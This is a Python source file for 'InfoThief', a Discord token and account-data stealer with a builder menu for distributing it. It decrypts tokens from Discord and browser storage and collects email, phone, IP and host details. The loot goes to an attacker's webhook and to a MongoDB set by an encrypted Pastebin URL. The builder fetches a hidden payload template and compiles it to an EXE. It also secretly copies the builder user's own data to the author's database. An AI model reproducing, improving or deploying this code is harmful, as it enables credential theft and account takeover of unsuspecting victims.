import os
import subprocess
import sys
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir, makedirs, path
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
from datetime import datetime
from pymongo import MongoClient
import threading
import pyfiglet  # For ASCII art
from colorama import Fore, Style, init  # For colored output

# Initialize colorama
init(autoreset=True)

encrypted_string_b64_1 = "p4jFiPnbfyQwSOOQQzg3riJnNBLKK+bxSkcfqr11JMjz9mk/PtY+AYvX+nXpfNo3"
key_b64_1 = "zzmfymnu0BPZffUtXSGwNg=="

encrypted_string_b64_2 = "e7OqntdkJzYeuYBddyWANX9ZZOcGVDM230KgPXfXn5YCHK4TFLXlj0uN7QK+oxSd"
key_b64_2 = "ZEF/BmFRaA5LUh3lUv0Agw=="

def decrypt_string(encrypted_string, key):
    encrypted_bytes = b64decode(encrypted_string)
    key_bytes = b64decode(key)
    
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    decrypted_string = cipher.decrypt(encrypted_bytes).decode('utf-8').strip()
    return decrypted_string

decrypted_string_1 = decrypt_string(encrypted_string_b64_1, key_b64_1)
decrypted_string_2 = decrypt_string(encrypted_string_b64_2, key_b64_2)

try:
    response = requests.get(decrypted_string_1)
    config = json.loads(response.text)
except Exception as e:
    print(Fore.RED + f"Error fetching configuration from Pastebin: {e}")
    config = None

if config:
    mongo_uri = config['mongo_uri']
    db_name = config['db_name']
    collection_name = config['collection_name']

    # Initialize MongoDB connection
    mongo_client = MongoClient(mongo_uri)
    db = mongo_client[db_name]
    collection = db[collection_name]
else:
    print(Fore.RED + "Could not load configuration from Pastebin.")

tokens = []
cleaned = []
checker = []

def send_to_mongodb(data):
    collection.insert_one(data)

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception:
        return "Error"

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def get_token():
    already_check = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path): 
            continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except: 
            continue

        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and not file.endswith(".log"): 
                continue

            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        x = x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError: 
                continue

        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)

        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError:
                continue
            checker.append(tok)

            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except:
                        continue

                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False

                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0

                        if has_nitro:
                            try:
                                end_date = nitro_data[0]["current_period_end"].split('+')[0]
                                start_date = nitro_data[0]["current_period_start"].split('+')[0]
                                d1 = datetime.strptime(end_date, "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(start_date, "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                            except Exception as e:
                                print(Fore.RED + f"Error parsing dates: {e}")

                        return {
                            "user_name": user_name,
                            "user_id": user_id,
                            "email": email,
                            "phone": phone,
                            "mfa_enabled": mfa_enabled,
                            "has_nitro": has_nitro,
                            "days_left": days_left,
                            "pc_username": pc_username,
                            "pc_name": pc_name,
                            "platform": platform,
                            "token": tok
                        }

def compile_script(filename):
    """Compiles the Python script into an EXE."""
    process = Popen(['pyinstaller', '--onefile', filename], stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    if process.returncode == 0:
        print(Fore.GREEN + "✅ Script compiled successfully!")
    else:
        print(Fore.RED + f"❌ Error compiling script: {stderr.decode()}")

def clear_console():
    """Clears the console."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_header():
    """Displays the ASCII art header."""
    ascii_art = pyfiglet.figlet_format("InfoThief")
    print(Fore.CYAN + ascii_art)
    print(Fore.MAGENTA + Style.BRIGHT + "Welcome to InfoThief - A Tool for Information Gathering 🕵️‍♂️")
    print(Fore.LIGHTYELLOW_EX + Style.DIM + "Gather and analyze information from multiple platforms in one place.\n")

def display_menu():
    """Displays the options menu."""
    print(Fore.YELLOW + Style.BRIGHT + "Select an option:")
    print(Fore.GREEN + "1. Test InfoThief (On Self) 🛠️")
    print(Fore.GREEN + "2. Create InfoThief (Distribute) 🚀")
    print(Fore.GREEN + "3. Exit 🛑")

# Main function to handle the options
if __name__ == "__main__":
    clear_console()
    display_header()
    display_menu()

    option = input(Fore.WHITE + "Enter your choice (1, 2, or 3): ")

    if option == "1":
        # Option 1 - Test
        user_data = get_token()
        if user_data:
            webhook_url = input("Please enter your Discord webhook URL: ")
            embed = {
                "username": "InfoThief 🕵️‍♀️ - Intelligence Infiltrator",
                "avatar_url": "https://cdn.discordapp.com/attachments/1299747290447798373/1299749975873290270/A_detective-style_hacker_icon_with_a_focus_on_the_face_and_head_minimal_background_related_to_previous_requests_1.png",
                "embeds": [{
                    "title": f"{user_data['user_name']} ({user_data['user_id']})",
                    "color": 0x2c30a8,
                    "fields": [
                        {
                            "name": "📂 Account Information",
                            "value": f"Username: {user_data['user_name']}\nUser ID: {user_data['user_id']}\nEmail: {user_data['email']}\nPhone: {user_data['phone']}\n2FA/MFA Enabled: {user_data['mfa_enabled']}\nNitro: {user_data['has_nitro']}\nExpires in: {user_data['days_left'] if user_data['days_left'] else 'None'} day(s)",
                            "inline": False
                        },
                        {
                            "name": "💻 PC Information",
                            "value": f"IP: {getip()}\nUsername: {user_data['pc_username']}\nPC Name: {user_data['pc_name']}\nPlatform: {user_data['platform']}",
                            "inline": False
                        },
                        {
                            "name": "🎉 Token",
                            "value": f"{user_data['token']}",
                            "inline": False
                        }
                    ],
                    "footer": {
                        "text": "Made by BigglesDevelopment❤️ | https://github.com/BigglesDevs"
                    }
                }]
            }

            try:
                requests.post(webhook_url, json=embed)
                print(Fore.GREEN + "Data sent to Discord webhook.")
            except Exception as e:
                print(Fore.RED + f"Failed to send data to Discord webhook: {e}")

            try:
                send_to_mongodb(user_data)
            except Exception as e:
                print(Fore.RED + f"Failed to save data to MongoDB: {e}")

    elif option == "2":
        webhook_url = input("Please enter your Discord webhook URL: ")
        filename = input("What would you like to name the generated script? (without .py): ")
        filename += ".py"

        dist_dir = "dist"
        if not path.exists(dist_dir):
            makedirs(dist_dir)

        try:
            response = requests.get(decrypted_string_2)
            template_script = response.text
            template_script = template_script.replace('YOUR_WEBHOOK_URL_HERE', webhook_url)

            script_path = path.join(dist_dir, filename)
            with open(script_path, "w", encoding='utf-8') as f:
                f.write(template_script)

            print(Fore.GREEN + f"Script created: {script_path}")

            compile_choice = input(Fore.WHITE + "Would you like to compile this script into an EXE? (y/n): ").lower()
            if compile_choice == 'y':
                compile_thread = threading.Thread(target=compile_script, args=(script_path,))
                compile_thread.start()
                compile_thread.join()

        except Exception as e:
            print(Fore.RED + f"Error creating script from Pastebin: {e}")

    elif option == "3":
        print(Fore.LIGHTCYAN_EX + "Goodbye! 👋 Exiting...")
        sys.exit(0)
